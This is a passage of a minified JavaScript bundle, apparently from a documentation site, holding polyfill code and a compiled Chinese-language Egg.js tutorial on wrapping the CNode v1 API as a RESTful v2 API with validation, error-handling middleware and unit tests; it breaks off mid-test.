h=c===Math.round(l)?l:c,f=s===Math.round(i)?i:s,E=Object(o["a"])(Object(o["a"])({},p),{},{offsetWidth:h,offsetHeight:f});null===u||void 0===u||u(E,e,a),n&&Promise.resolve().then((function(){n(E,e)}))}}),[]);return r["useEffect"]((function(){var e=k();return e&&!a&&p(e,x),function(){return h(e,x)}}),[l.current,a]),r["createElement"](v,{ref:s},f?r["cloneElement"](m,{ref:b}):m)}var x=r["forwardRef"](w);var j=x,S="rc-observer-key";function C(e,t){var n=e.children,o="function"===typeof n?[n]:Object(l["a"])(n);return o.map((function(n,l){var o=(null===n||void 0===n?void 0:n.key)||"".concat(S,"-").concat(l);return r["createElement"](j,Object(a["a"])({},e,{key:o,ref:0===l?t:void 0}),n)}))}var A=r["forwardRef"](C);A.Collection=k;t["a"]=A},"0mt+":function(e,t,n){var a=n("A0UU"),r=n("vr25").f,l=n("XExY"),o=n("AzF/"),i=n("1xGk"),c=n("bOLl"),s=n("ALk6");e.exports=function(e,t){var n,u,d,m,p,h,g=e.target,f=e.global,E=e.stat;if(u=f?a:E?a[g]||i(g,{}):(a[g]||{}).prototype,u)for(d in t){if(p=t[d],e.noTargetGet?(h=r(u,d),m=h&&h.value):m=u[d],n=s(f?d:g+(E?".":"#")+d,e.forced),!n&&void 0!==m){if(typeof p===typeof m)continue;c(p,m)}(e.sham||m&&m.sham)&&l(p,"sham",!0),o(u,d,p,e)}}},1:function(e,t){},"1+Tz":function(e,t){t.f=Object.getOwnPropertySymbols},"16wp":function(e,t,n){var a=n("oi/H");a(Math,"Math",!0)},"1G6B":function(e,t,n){"use strict";var a=n("MAgz"),r=n("N0Us"),l=n("uYj3"),o=n("m/os"),i=n("Xdqv"),c=a.aTypedArray,s=a.exportTypedArrayMethod,u=i((function(){new Int8Array(1).set({})}));s("set",(function(e){c(this);var t=l(arguments.length>1?arguments[1]:void 0,1),n=this.length,a=o(e),i=r(a.length),s=0;if(i+t>n)throw RangeError("Wrong length");while(s<i)this[t+s]=a[s++]}),u)},"1HCi":function(e,t){e.exports=function(e,t,n,a){var r=n?n.call(a,e,t):void 0;if(void 0!==r)return!!r;if(e===t)return!0;if("object"!==typeof e||!e||"object"!==typeof t||!t)return!1;var l=Object.keys(e),o=Object.keys(t);if(l.length!==o.length)return!1;for(var i=Object.prototype.hasOwnProperty.bind(t),c=0;c<l.length;c++){var s=l[c];if(!i(s))return!1;var u=e[s],d=t[s];if(r=n?n.call(a,u,d,s):void 0,!1===r||void 0===r&&u!==d)return!1}return!0}},"1MN/":function(e,t,n){var a=n("0mt+"),r=n("V2dk");a({target:"WeakMap",stat:!0},{from:r})},"1RB8":function(e,t,n){"use strict";e.exports=n("rUla")},"1kAJ":function(e,t,n){"use strict";var a=n("9Rcy"),r=n("QiLd"),l=n("m/os"),o=n("N0Us"),i=n("u3TI").f;a&&!("lastIndex"in[])&&(i(Array.prototype,"lastIndex",{configurable:!0,get:function(){var e=l(this),t=o(e.length);return 0==t?0:t-1}}),r("lastIndex"))},"1or5":function(e,t,n){"use strict";var a=n("0mt+"),r=n("vr25").f,l=n("N0Us"),o=n("+7qM"),i=n("tS9j"),c=n("Pgx2"),s=n("m4/z"),u="".startsWith,d=Math.min,m=c("startsWith"),p=!s&&!m&&!!function(){var e=r(String.prototype,"startsWith");return e&&!e.writable}();a({target:"String",proto:!0,forced:!p&&!m},{startsWith:function(e){var t=String(i(this));o(e);var n=l(d(arguments.length>1?arguments[1]:void 0,t.length)),a=String(e);return u?u.call(t,a,n):t.slice(n,n+a.length)===a}})},"1xGk":function(e,t,n){var a=n("A0UU"),r=n("XExY");e.exports=function(e,t){try{r(a,e,t)}catch(n){a[e]=t}return t}},"2EJr":function(e,t,n){"use strict";function a(){return a=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},a.apply(this,arguments)}n.d(t,"a",(function(){return a}))},"2FGb":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u901a\u8fc7 Web \u6280\u672f\u5f00\u53d1\u670d\u52a1\u7ed9\u5ba2\u6237\u7aef\u63d0\u4f9b\u63a5\u53e3\uff0c\u53ef\u80fd\u662f\u5404\u4e2a Web \u6846\u67b6\u6700\u5e7f\u6cdb\u7684\u5e94\u7528\u4e4b\u4e00\u3002\u8fd9\u7bc7\u6587\u7ae0\u6211\u4eec\u62ff ",r.a.createElement(l["Link"],{to:"https://cnodejs.org/"},"CNode \u793e\u533a")," \u7684\u63a5\u53e3\u6765\u770b\u4e00\u770b\u901a\u8fc7 Egg \u5982\u4f55\u5b9e\u73b0 ",r.a.createElement(l["Link"],{to:"https://zh.wikipedia.org/wiki/REST"},"RESTful")," API \u7ed9\u5ba2\u6237\u7aef\u8c03\u7528\u3002"),r.a.createElement("p",null,"CNode \u793e\u533a\u73b0\u5728 v1 \u7248\u672c\u7684\u63a5\u53e3\u4e0d\u662f\u5b8c\u5168\u7b26\u5408 RESTful \u8bed\u4e49\uff0c\u5728\u8fd9\u7bc7\u6587\u7ae0\u4e2d\uff0c\u6211\u4eec\u5c06\u57fa\u4e8e CNode V1 \u7684\u63a5\u53e3\uff0c\u5c01\u88c5\u4e00\u4e2a\u66f4\u7b26\u5408 RESTful \u8bed\u4e49\u7684 V2 \u7248\u672c API\u3002"),r.a.createElement("h2",{id:"\u8bbe\u8ba1\u54cd\u5e94\u683c\u5f0f"},r.a.createElement(l["AnchorLink"],{to:"#\u8bbe\u8ba1\u54cd\u5e94\u683c\u5f0f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8bbe\u8ba1\u54cd\u5e94\u683c\u5f0f"),r.a.createElement("p",null,"\u5728 RESTful \u98ce\u683c\u7684\u8bbe\u8ba1\u4e2d\uff0c\u6211\u4eec\u4f1a\u901a\u8fc7\u54cd\u5e94\u72b6\u6001\u7801\u6765\u6807\u8bc6\u54cd\u5e94\u7684\u72b6\u6001\uff0c\u4fdd\u6301\u54cd\u5e94\u7684 body \u7b80\u6d01\uff0c\u53ea\u8fd4\u56de\u63a5\u53e3\u6570\u636e\u3002\u4ee5 ",r.a.createElement("code",null,"topics")," \u8d44\u6e90\u4e3a\u4f8b\uff1a"),r.a.createElement("h3",{id:"\u83b7\u53d6\u4e3b\u9898\u5217\u8868"},r.a.createElement(l["AnchorLink"],{to:"#\u83b7\u53d6\u4e3b\u9898\u5217\u8868","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u83b7\u53d6\u4e3b\u9898\u5217\u8868"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"GET /api/v2/topics")),r.a.createElement("li",null,"\u54cd\u5e94\u72b6\u6001\u7801\uff1a200"),r.a.createElement("li",null,"\u54cd\u5e94\u4f53\uff1a")),r.a.createElement(o["a"],{code:'[\n  {\n    "id": "57ea257b3670ca3f44c5beb6",\n    "author_id": "541bf9b9ad60405c1f151a03",\n    "tab": "share",\n    "content": "content",\n    "last_reply_at": "2017-01-11T13:32:25.089Z",\n    "good": false,\n    "top": true,\n    "reply_count": 155,\n    "visit_count": 28176,\n    "create_at": "2016-09-27T07:53:31.872Z"\n  },\n  {\n    "id": "57ea257b3670ca3f44c5beb6",\n    "author_id": "541bf9b9ad60405c1f151a03",\n    "tab": "share",\n    "content": "content",\n    "title": "\u300a\u4e00\u8d77\u5b66 Node.js\u300b\u5f7b\u5e95\u91cd\u5199\u5b8c\u6bd5",\n    "last_reply_at": "2017-01-11T10:20:56.496Z",\n    "good": false,\n    "top": true,\n    "reply_count": 193,\n    "visit_count": 47633\n  }\n]',lang:"json"}),r.a.createElement("h3",{id:"\u83b7\u53d6\u5355\u4e2a\u4e3b\u9898"},r.a.createElement(l["AnchorLink"],{to:"#\u83b7\u53d6\u5355\u4e2a\u4e3b\u9898","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u83b7\u53d6\u5355\u4e2a\u4e3b\u9898"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"GET /api/v2/topics/57ea257b3670ca3f44c5beb6")),r.a.createElement("li",null,"\u54cd\u5e94\u72b6\u6001\u7801\uff1a200"),r.a.createElement("li",null,"\u54cd\u5e94\u4f53\uff1a")),r.a.createElement(o["a"],{code:'{\n  "id": "57ea257b3670ca3f44c5beb6",\n  "author_id": "541bf9b9ad60405c1f151a03",\n  "tab": "share",\n  "content": "content",\n  "title": "\u300a\u4e00\u8d77\u5b66 Node.js\u300b\u5f7b\u5e95\u91cd\u5199\u5b8c\u6bd5",\n  "last_reply_at": "2017-01-11T10:20:56.496Z",\n  "good": false,\n  "top": true,\n  "reply_count": 193,\n  "visit_count": 47633\n}',lang:"json"}),r.a.createElement("h3",{id:"\u521b\u5efa\u4e3b\u9898"},r.a.createElement(l["AnchorLink"],{to:"#\u521b\u5efa\u4e3b\u9898","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u521b\u5efa\u4e3b\u9898"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"POST /api/v2/topics")),r.a.createElement("li",null,"\u54cd\u5e94\u72b6\u6001\u7801\uff1a201"),r.a.createElement("li",null,"\u54cd\u5e94\u4f53\uff1a")),r.a.createElement(o["a"],{code:'{\n  "topic_id": "57ea257b3670ca3f44c5beb6"\n}',lang:"unknown"}),r.a.createElement("h3",{id:"\u66f4\u65b0\u4e3b\u9898"},r.a.createElement(l["AnchorLink"],{to:"#\u66f4\u65b0\u4e3b\u9898","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u66f4\u65b0\u4e3b\u9898"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"PUT /api/v2/topics/57ea257b3670ca3f44c5beb6")),r.a.createElement("li",null,"\u54cd\u5e94\u72b6\u6001\u7801\uff1a204"),r.a.createElement("li",null,"\u54cd\u5e94\u4f53\uff1a\u7a7a")),r.a.createElement("h3",{id:"\u9519\u8bef\u5904\u7406"},r.a.createElement(l["AnchorLink"],{to:"#\u9519\u8bef\u5904\u7406","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9519\u8bef\u5904\u7406"),r.a.createElement("p",null,"\u5728\u63a5\u53e3\u5904\u7406\u53d1\u751f\u9519\u8bef\u7684\u65f6\u5019\uff0c\u5982\u679c\u662f\u5ba2\u6237\u7aef\u8bf7\u6c42\u53c2\u6570\u5bfc\u81f4\u7684\u9519\u8bef\uff0c\u6211\u4eec\u4f1a\u8fd4\u56de 4xx \u72b6\u6001\u7801\uff0c\u5982\u679c\u662f\u670d\u52a1\u7aef\u81ea\u8eab\u7684\u5904\u7406\u903b\u8f91\u9519\u8bef\uff0c\u6211\u4eec\u4f1a\u8fd4\u56de 5xx \u72b6\u6001\u7801\u3002\u6240\u6709\u7684\u5f02\u5e38\u5bf9\u8c61\u90fd\u662f\u5bf9\u8fd9\u4e2a\u5f02\u5e38\u72b6\u6001\u7684\u63cf\u8ff0\uff0c\u5176\u4e2d error \u5b57\u6bb5\u662f\u9519\u8bef\u7684\u63cf\u8ff0\uff0cdetail \u5b57\u6bb5\uff08\u53ef\u9009\uff09\u662f\u5bfc\u81f4\u9519\u8bef\u7684\u8be6\u7ec6\u539f\u56e0\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u5f53\u5ba2\u6237\u7aef\u4f20\u9012\u7684\u53c2\u6570\u5f02\u5e38\u65f6\uff0c\u6211\u4eec\u53ef\u80fd\u8fd4\u56de\u4e00\u4e2a\u54cd\u5e94\uff0c\u72b6\u6001\u7801\u4e3a 422\uff0c\u8fd4\u56de\u54cd\u5e94\u4f53\u4e3a\uff1a"),r.a.createElement(o["a"],{code:'{\n  "error": "Validation Failed",\n  "detail": [\n    { "message": "required", "field": "title", "code": "missing_field" }\n  ]\n}',lang:"json"}),r.a.createElement("h2",{id:"\u5b9e\u73b0"},r.a.createElement(l["AnchorLink"],{to:"#\u5b9e\u73b0","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5b9e\u73b0"),r.a.createElement("p",null,"\u5728\u7ea6\u5b9a\u597d\u63a5\u53e3\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u52a8\u624b\u5b9e\u73b0\u4e86\u3002"),r.a.createElement("h3",{id:"\u521d\u59cb\u5316\u9879\u76ee"},r.a.createElement(l["AnchorLink"],{to:"#\u521d\u59cb\u5316\u9879\u76ee","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u521d\u59cb\u5316\u9879\u76ee"),r.a.createElement("p",null,"\u8fd8\u662f\u901a\u8fc7",r.a.createElement(l["Link"],{to:"../intro/quickstart"},"\u5feb\u901f\u5165\u95e8"),"\u7ae0\u8282\u4ecb\u7ecd\u7684 ",r.a.createElement("code",null,"npm")," \u6765\u521d\u59cb\u5316\u6211\u4eec\u7684\u5e94\u7528"),r.a.createElement(o["a"],{code:"$ mkdir cnode-api && cd cnode-api\n$ npm init egg --type=simple\n$ npm i",lang:"bash"}),r.a.createElement("h3",{id:"\u5f00\u542f-validate-\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u5f00\u542f-validate-\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5f00\u542f validate \u63d2\u4ef6"),r.a.createElement("p",null,"\u6211\u4eec\u9009\u62e9 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-validate"},"egg-validate")," \u4f5c\u4e3a validate \u63d2\u4ef6\u7684\u793a\u4f8b\u3002"),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.validate = {\n  enable: true,\n  package: 'egg-validate',\n};",lang:"js"}),r.a.createElement("h3",{id:"\u6ce8\u518c\u8def\u7531"},r.a.createElement(l["AnchorLink"],{to:"#\u6ce8\u518c\u8def\u7531","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6ce8\u518c\u8def\u7531"),r.a.createElement("p",null,"\u9996\u5148\uff0c\u6211\u4eec\u5148\u6309\u7167\u524d\u9762\u7684\u8bbe\u8ba1\u6765\u6ce8\u518c",r.a.createElement(l["Link"],{to:"../basics/router"},"\u8def\u7531"),"\uff0c\u6846\u67b6\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4fbf\u6377\u7684\u65b9\u5f0f\u6765\u521b\u5efa RESTful \u98ce\u683c\u7684\u8def\u7531\uff0c\u5e76\u5c06\u4e00\u4e2a\u8d44\u6e90\u7684\u63a5\u53e3\u6620\u5c04\u5230\u5bf9\u5e94\u7684 controller \u6587\u4ef6\u3002\u5728 ",r.a.createElement("code",null,"app/router.js")," \u4e2d\uff1a"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.resources('topics', '/api/v2/topics', app.controller.topics);\n};",lang:"js"}),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"app.resources")," \u65b9\u6cd5\uff0c\u6211\u4eec\u5c06 topics \u8fd9\u4e2a\u8d44\u6e90\u7684\u589e\u5220\u6539\u67e5\u63a5\u53e3\u6620\u5c04\u5230\u4e86 ",r.a.createElement("code",null,"app/controller/topics.js")," \u6587\u4ef6\u3002"),r.a.createElement("h3",{id:"controller-\u5f00\u53d1"},r.a.createElement(l["AnchorLink"],{to:"#controller-\u5f00\u53d1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"controller \u5f00\u53d1"),r.a.createElement("p",null,"\u5728 ",r.a.createElement(l["Link"],{to:"../basics/controller"},"controller")," \u4e2d\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5b9e\u73b0 ",r.a.createElement("code",null,"app.resources")," \u7ea6\u5b9a\u7684 ",r.a.createElement(l["AnchorLink"],{to:"../basics/router#restful-%E9%A3%8E%E6%A0%BC%E7%9A%84-url-%E5%AE%9A%E4%B9%89"},"RESTful \u98ce\u683c\u7684 URL \u5b9a\u4e49")," \u4e2d\u6211\u4eec\u9700\u8981\u63d0\u4f9b\u7684\u63a5\u53e3\u5373\u53ef\u3002\u4f8b\u5982\u6211\u4eec\u6765\u5b9e\u73b0\u521b\u5efa\u4e00\u4e2a topics \u7684\u63a5\u53e3\uff1a"),r.a.createElement(o["a"],{code:"// app/controller/topics.js\nconst Controller = require('egg').Controller;\n\n// \u5b9a\u4e49\u521b\u5efa\u63a5\u53e3\u7684\u8bf7\u6c42\u53c2\u6570\u89c4\u5219\nconst createRule = {\n  accesstoken: 'string',\n  title: 'string',\n  tab: { type: 'enum', values: ['ask', 'share', 'job'], required: false },\n  content: 'string',\n};\n\nclass TopicController extends Controller {\n  async create() {\n    const ctx = this.ctx;\n    // \u6821\u9a8c `ctx.request.body` \u662f\u5426\u7b26\u5408\u6211\u4eec\u9884\u671f\u7684\u683c\u5f0f\n    // \u5982\u679c\u53c2\u6570\u6821\u9a8c\u672a\u901a\u8fc7\uff0c\u5c06\u4f1a\u629b\u51fa\u4e00\u4e2a status = 422 \u7684\u5f02\u5e38\n    ctx.validate(createRule, ctx.request.body);\n    // \u8c03\u7528 service \u521b\u5efa\u4e00\u4e2a topic\n    const id = await ctx.service.topics.create(ctx.request.body);\n    // \u8bbe\u7f6e\u54cd\u5e94\u4f53\u548c\u72b6\u6001\u7801\n    ctx.body = {\n      topic_id: id,\n    };\n    ctx.status = 201;\n  }\n}\nmodule.exports = TopicController;",lang:"js"}),r.a.createElement("p",null,"\u5982\u540c\u6ce8\u91ca\u4e2d\u8bf4\u660e\u7684\uff0c\u4e00\u4e2a Controller \u4e3b\u8981\u5b9e\u73b0\u4e86\u4e0b\u9762\u7684\u903b\u8f91\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u8c03\u7528 validate \u65b9\u6cd5\u5bf9\u8bf7\u6c42\u53c2\u6570\u8fdb\u884c\u9a8c\u8bc1\u3002"),r.a.createElement("li",null,"\u7528\u9a8c\u8bc1\u8fc7\u7684\u53c2\u6570\u8c03\u7528 service \u5c01\u88c5\u7684\u4e1a\u52a1\u903b\u8f91\u6765\u521b\u5efa\u4e00\u4e2a topic\u3002"),r.a.createElement("li",null,"\u6309\u7167\u63a5\u53e3\u7ea6\u5b9a\u7684\u683c\u5f0f\u8bbe\u7f6e\u54cd\u5e94\u72b6\u6001\u7801\u548c\u5185\u5bb9\u3002")),r.a.createElement("h3",{id:"service-\u5f00\u53d1"},r.a.createElement(l["AnchorLink"],{to:"#service-\u5f00\u53d1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"service \u5f00\u53d1"),r.a.createElement("p",null,"\u5728 ",r.a.createElement(l["Link"],{to:"../basics/service"},"service")," \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u66f4\u52a0\u4e13\u6ce8\u7684\u7f16\u5199\u5b9e\u9645\u751f\u6548\u7684\u4e1a\u52a1\u903b\u8f91\u3002"),r.a.createElement(o["a"],{code:"// app/service/topics.js\nconst Service = require('egg').Service;\n\nclass TopicService extends Service {\n  constructor(ctx) {\n    super(ctx);\n    this.root = 'https://cnodejs.org/api/v1';\n  }\n\n  async create(params) {\n    // \u8c03\u7528 CNode V1 \u7248\u672c API\n    const result = await this.ctx.curl(`${this.root}/topics`, {\n      method: 'post',\n      data: params,\n      dataType: 'json',\n      contentType: 'json',\n    });\n    // \u68c0\u67e5\u8c03\u7528\u662f\u5426\u6210\u529f\uff0c\u5982\u679c\u8c03\u7528\u5931\u8d25\u4f1a\u629b\u51fa\u5f02\u5e38\n    this.checkSuccess(result);\n    // \u8fd4\u56de\u521b\u5efa\u7684 topic \u7684 id\n    return result.data.topic_id;\n  }\n\n  // \u5c01\u88c5\u7edf\u4e00\u7684\u8c03\u7528\u68c0\u67e5\u51fd\u6570\uff0c\u53ef\u4ee5\u5728\u67e5\u8be2\u3001\u521b\u5efa\u548c\u66f4\u65b0\u7b49 Service \u4e2d\u590d\u7528\n  checkSuccess(result) {\n    if (result.status !== 200) {\n      const errorMsg =\n        result.data && result.data.error_msg\n          ? result.data.error_msg\n          : 'unknown error';\n      this.ctx.throw(result.status, errorMsg);\n    }\n    if (!result.data.success) {\n      // \u8fdc\u7a0b\u8c03\u7528\u8fd4\u56de\u683c\u5f0f\u9519\u8bef\n      this.ctx.throw(500, 'remote response error', { data: result.data });\n    }\n  }\n}\n\nmodule.exports = TopicService;",lang:"js"}),r.a.createElement("p",null,"\u5728\u521b\u5efa topic \u7684 Service \u5f00\u53d1\u5b8c\u6210\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u4ece\u4e0a\u5f80\u4e0b\u7684\u5b8c\u6210\u4e86\u4e00\u4e2a\u63a5\u53e3\u7684\u5f00\u53d1\u3002"),r.a.createElement("h3",{id:"\u7edf\u4e00\u9519\u8bef\u5904\u7406"},r.a.createElement(l["AnchorLink"],{to:"#\u7edf\u4e00\u9519\u8bef\u5904\u7406","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7edf\u4e00\u9519\u8bef\u5904\u7406"),r.a.createElement("p",null,"\u6b63\u5e38\u7684\u4e1a\u52a1\u903b\u8f91\u5df2\u7ecf\u6b63\u5e38\u5b8c\u6210\u4e86\uff0c\u4f46\u662f\u5f02\u5e38\u6211\u4eec\u8fd8\u6ca1\u6709\u8fdb\u884c\u5904\u7406\u3002\u5728\u524d\u9762\u7f16\u5199\u7684\u4ee3\u7801\u4e2d\uff0cController \u548c Service \u90fd\u6709\u53ef\u80fd\u629b\u51fa\u5f02\u5e38\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u63a8\u8350\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u5f53\u53d1\u73b0\u5ba2\u6237\u7aef\u53c2\u6570\u4f20\u9012\u9519\u8bef\u6216\u8005\u8c03\u7528\u540e\u7aef\u670d\u52a1\u5f02\u5e38\u65f6\uff0c\u901a\u8fc7\u629b\u51fa\u5f02\u5e38\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u4e2d\u65ad\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"Controller \u4e2d ",r.a.createElement("code",null,"this.ctx.validate()")," \u8fdb\u884c\u53c2\u6570\u6821\u9a8c\uff0c\u5931\u8d25\u629b\u51fa\u5f02\u5e38\u3002"),r.a.createElement("li",null,"Service \u4e2d\u8c03\u7528 ",r.a.createElement("code",null,"this.ctx.curl()")," \u65b9\u6cd5\u8bbf\u95ee CNode \u670d\u52a1\uff0c\u53ef\u80fd\u7531\u4e8e\u7f51\u7edc\u95ee\u9898\u7b49\u539f\u56e0\u629b\u51fa\u670d\u52a1\u7aef\u5f02\u5e38\u3002"),r.a.createElement("li",null,"Service \u4e2d\u62ff\u5230 CNode \u670d\u52a1\u7aef\u8fd4\u56de\u7684\u7ed3\u679c\u540e\uff0c\u53ef\u80fd\u4f1a\u6536\u5230\u8bf7\u6c42\u8c03\u7528\u5931\u8d25\u7684\u8fd4\u56de\u7ed3\u679c\uff0c\u6b64\u65f6\u4e5f\u4f1a\u629b\u51fa\u5f02\u5e38\u3002")),r.a.createElement("p",null,"\u6846\u67b6\u867d\u7136\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u7684\u5f02\u5e38\u5904\u7406\uff0c\u4f46\u662f\u53ef\u80fd\u548c\u6211\u4eec\u5728\u524d\u9762\u7684\u63a5\u53e3\u7ea6\u5b9a\u4e0d\u4e00\u81f4\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u81ea\u5df1\u5b9e\u73b0\u4e00\u4e2a\u7edf\u4e00\u9519\u8bef\u5904\u7406\u7684\u4e2d\u95f4\u4ef6\u6765\u5bf9\u9519\u8bef\u8fdb\u884c\u5904\u7406\u3002"),r.a.createElement("p",null,"\u5728 ",r.a.createElement("code",null,"app/middleware")," \u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2a ",r.a.createElement("code",null,"error_handler.js")," \u7684\u6587\u4ef6\u6765\u65b0\u5efa\u4e00\u4e2a ",r.a.createElement(l["Link"],{to:"../basics/middleware"},"middleware")),r.a.createElement(o["a"],{code:"// app/middleware/error_handler.js\nmodule.exports = () => {\n  return async function errorHandler(ctx, next) {\n    try {\n      await next();\n    } catch (err) {\n      // \u6240\u6709\u7684\u5f02\u5e38\u90fd\u5728 app \u4e0a\u89e6\u53d1\u4e00\u4e2a error \u4e8b\u4ef6\uff0c\u6846\u67b6\u4f1a\u8bb0\u5f55\u4e00\u6761\u9519\u8bef\u65e5\u5fd7\n      ctx.app.emit('error', err, ctx);\n\n      const status = err.status || 500;\n      // \u751f\u4ea7\u73af\u5883\u65f6 500 \u9519\u8bef\u7684\u8be6\u7ec6\u9519\u8bef\u5185\u5bb9\u4e0d\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u56e0\u4e3a\u53ef\u80fd\u5305\u542b\u654f\u611f\u4fe1\u606f\n      const error =\n        status === 500 && ctx.app.config.env === 'prod'\n          ? 'Internal Server Error'\n          : err.message;\n\n      // \u4ece error \u5bf9\u8c61\u4e0a\u8bfb\u51fa\u5404\u4e2a\u5c5e\u6027\uff0c\u8bbe\u7f6e\u5230\u54cd\u5e94\u4e2d\n      ctx.body = { error };\n      if (status === 422) {\n        ctx.body.detail = err.errors;\n      }\n      ctx.status = status;\n    }\n  };\n};",lang:"js"}),r.a.createElement("p",null,"\u901a\u8fc7\u8fd9\u4e2a\u4e2d\u95f4\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u6355\u83b7\u6240\u6709\u5f02\u5e38\uff0c\u5e76\u6309\u7167\u6211\u4eec\u60f3\u8981\u7684\u683c\u5f0f\u5c01\u88c5\u4e86\u54cd\u5e94\u3002\u5c06\u8fd9\u4e2a\u4e2d\u95f4\u4ef6\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6(",r.a.createElement("code",null,"config/config.default.js"),")\u52a0\u8f7d\u8fdb\u6765\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  // \u52a0\u8f7d errorHandler \u4e2d\u95f4\u4ef6\n  middleware: ['errorHandler'],\n  // \u53ea\u5bf9 /api \u524d\u7f00\u7684 url \u8def\u5f84\u751f\u6548\n  errorHandler: {\n    match: '/api',\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6d4b\u8bd5"),r.a.createElement("p",null,"\u4ee3\u7801\u5b8c\u6210\u53ea\u662f\u7b2c\u4e00\u6b65\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u7ed9\u4ee3\u7801\u52a0\u4e0a",r.a.createElement(l["Link"],{to:"../core/unittest"},"\u5355\u5143\u6d4b\u8bd5"),"\u3002"),r.a.createElement("h3",{id:"controller-\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#controller-\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller \u6d4b\u8bd5"),r.a.createElement("p",null,"\u6211\u4eec\u5148\u6765\u7f16\u5199 Controller \u4ee3\u7801\u7684\u5355\u5143\u6d4b\u8bd5\u3002\u5728\u5199 Controller \u5355\u6d4b\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u9002\u65f6\u7684\u6a21\u62df Service \u5c42\u7684\u5b9e\u73b0\uff0c\u56e0\u4e3a\u5bf9 Controller \u7684\u5355\u5143\u6d4b\u8bd5\u800c\u8a00\uff0c\u6700\u91cd\u8981\u7684\u90e8\u5206\u662f\u6d4b\u8bd5\u81ea\u8eab\u7684\u903b\u8f91\uff0c\u800c Service \u5c42\u6309\u7167\u7ea6\u5b9a\u7684\u63a5\u53e3 mock \u6389\uff0cService \u81ea\u8eab\u7684\u903b\u8f91\u53ef\u4ee5\u8ba9 Service \u7684\u5355\u5143\u6d4b\u8bd5\u6765\u8986\u76d6\uff0c\u8fd9\u6837\u6211\u4eec\u5f00\u53d1\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u5206\u5c42\u8fdb\u884c\u5f00\u53d1\u6d4b\u8bd5\u3002"),r.a.createElement(o["a"],{code:"const { app, mock, assert } = require('egg-mock/bootstrap');\n\ndescribe('test/app/controller/topics.test.js', () => {\n  // \u6d4b\u8bd5\u8bf7\u6c42\u53c2\u6570\u9519\u8bef\u65f6\u5e94\u7528\u7684\u54cd\u5e94\n  it('should POST /api/v2/topics/ 422', () => {\n    app.mockCsrf();\n    return app\n      .httpRequest()\n      .post('/api/v2/topics')\n      .send({\n        accesstoken: '123',\n      })\n      .expect(422)\n      .expect({\n        error: 'Validation Failed',\n        detail: [\n          { message: 'required', field: 'title', code: 'missing_field' },\n          { message: 'required', field: 'content', code: 'missing_field' },\n        ],\n      });\n  });\n\n  // mock \u6389 service \u5c42\uff0c\u6d4b\u8bd5\u6b63\u5e38\u65f6\u7684\u8fd4\u56de\n  it('should POST /api/v2/topics/ 201', () => {\n    app.mockCsrf();\n    app.mockService('topics', 'create', 123);\n    return app\n      .httpRequest()\n      .post('/api/v2/topics')\n      .send({\n        accesstoken: '123',\n        title: 'title',\n        content: 'hello',\n      